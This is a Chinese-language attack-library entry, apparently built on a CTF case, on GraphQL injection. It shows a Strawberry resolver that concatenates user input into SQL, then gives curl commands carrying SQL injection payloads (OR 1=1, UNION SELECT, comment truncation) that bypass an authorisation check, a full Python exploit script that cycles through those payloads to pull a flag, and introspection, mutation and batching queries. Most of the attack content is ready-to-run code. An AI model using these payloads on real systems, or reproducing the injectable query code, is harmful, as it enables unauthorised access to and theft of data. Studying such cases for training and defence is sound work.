# GraphQL 注入 - 攻击库
**Keywords**: GraphQL, GraphQL Injection, Introspection, Query, Mutation, API, GraphQL IDOR, SQL Injection in GraphQL

## 1. GraphQL基础

### GraphQL与REST的差异

```
REST: 固定的endpoint，通过URL和参数获取数据
GraphQL: 灵活的查询语言，可以自定义获取的字段
```

### 案例038 - GraphQL SQL注入和授权绕过

#### 漏洞代码
```python
@strawberry.type
class Query:
    @strawberry.field
    def jobs(self, _info: Info, job_type: str = "") -> List[Job]:
        if job_type and job_type == 'private':
            raise Exception("Only admins can see private jobs")  # 权限检查可绕过
        
        if job_type:
            query = f"SELECT * FROM jobs WHERE type = '{job_type}'"  # SQL注入
        else:
            query = "SELECT * FROM jobs WHERE type IN ('front-end', 'back-end')"
```

#### 漏洞分析

1. **SQL注入**：job_type参数直接拼接到SQL查询
2. **授权绕过**：权限检查可通过SQL注入绕过
3. **信息泄露**：可以获取private类型的job内容

#### 攻击方法1: 直接查询

```bash
curl -X POST "http://target/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ jobs { id name type description } }"}'
```

#### 攻击方法2: SQL注入绕过权限

```bash
# 使用' OR '1'='1绕过权限检查
curl -X POST "http://target/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ jobs(jobType: \"'"'"' OR '"'"'1'"'"'='"'"'1\") { id name type description } }"}'

# 或使用注释绕过
curl -X POST "http://target/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ jobs(jobType: \"private'"'"' --\") { id name type description } }"}'
```

#### 攻击方法3: UNION SELECT

```bash
# 使用UNION SELECT读取FLAG
curl -X POST "http://target/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ jobs(jobType: \"'"'"' UNION SELECT * FROM jobs WHERE type='"'"'private'"'"' --\") { id name type description } }"}'
```

#### Python完整利用脚本

```python
#!/usr/bin/env python3
import requests
import json
import sys

def exploit_graphql(target_url):
    """
    利用GraphQL SQL注入和授权绕过
    """
    target = target_url.rstrip('/') + '/graphql'
    
    print(f"[*] 目标: {target}")
    print("[*] 漏洞: GraphQL SQL注入 + 授权绕过\n")
    
    # 步骤1: 查询所有jobs
    print("[*] 步骤1: 查询所有jobs...")
    query = '{ jobs { id name type description } }'
    
    payload = {"query": query}
    r = requests.post(target, json=payload)
    
    result = r.json()
    print(json.dumps(result, indent=2))
    
    # 检查flag
    if 'data' in result and 'jobs' in result['data']:
        for job in result['data']['jobs']:
            if 'flag' in job.get('description', '').lower():
                print(f"\n[+] 找到FLAG: {job['description']}")
                return job['description']
    
    # 步骤2: 使用SQL注入绕过权限
    print("\n[*] 步骤2: 使用SQL注入绕过权限...")
    
    sql_payloads = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "private' --",
        "' UNION SELECT * FROM jobs WHERE '1'='1",
    ]
    
    for payload_str in sql_payloads:
        print(f"\n[*] 尝试payload: {payload_str}")
        
        # GraphQL查询格式
        query = f'{{ jobs(jobType: "{payload_str}") {{ id name type description }} }}'
        
        payload = {"query": query}
        r = requests.post(target, json=payload)
        
        result = r.json()
        
        if 'data' in result and 'jobs' in result['data']:
            jobs = result['data']['jobs']
            if jobs:
                print(f"[+] 返回{len(jobs)}个jobs")
                
                for job in jobs:
                    if 'flag' in job.get('description', '').lower():
                        print(f"[+] 找到FLAG!")
                        print(f"[+] {job['description']}")
                        return job['description']

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <目标URL>")
        sys.exit(1)
    
    print("="*60)
    print("案例038 GraphQL SQL注入利用脚本")
    print("="*60 + "\n")
    
    exploit_graphql(sys.argv[1])
```

## 2. 其他GraphQL攻击方法

### 2.1 信息泄露 - 通过错误消息

```bash
# 触发错误获取信息
curl -X POST "http://target/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users { password } }"}'

# 查看错误消息可能泄露敏感信息
```

### 2.2 内省攻击 - 枚举所有可用字段

```bash
# 获取GraphQL schema
curl -X POST "http://target/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name } } } }"}'

# 获取所有query
curl -X POST "http://target/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { queryType { fields { name } } } }"}'
```

### 2.3 Mutation攻击 - 修改数据

```bash
# 尝试执行mutation修改数据
curl -X POST "http://target/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation { createUser(name: \"admin\") { id name } }"}'
```

### 2.4 批量查询攻击

```bash
# 一次发送多个查询
curl -X POST "http://target/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "[{ users { id } }, { jobs { id } }, { data { id } }]"}'
```

## 3. GraphQL工具

### 使用GraphQL-client工具

```bash
# 下载GraphQL安全测试工具
pip install graphqlclient
pip install graphql-core

# 简单测试
python3 << 'EOF'
from graphqlclient import GraphQLClient
client = GraphQLClient('http://target/graphql')
result = client.execute('{ jobs { id name } }')
print(result)
EOF
```

### 使用Burp Suite GraphQL扩展

```
1. 安装Burp Suite
2. 下载GraphQL扩展
3. 配置GraphQL endpoint
4. 使用扩展的schema enum等功能进行测试
```

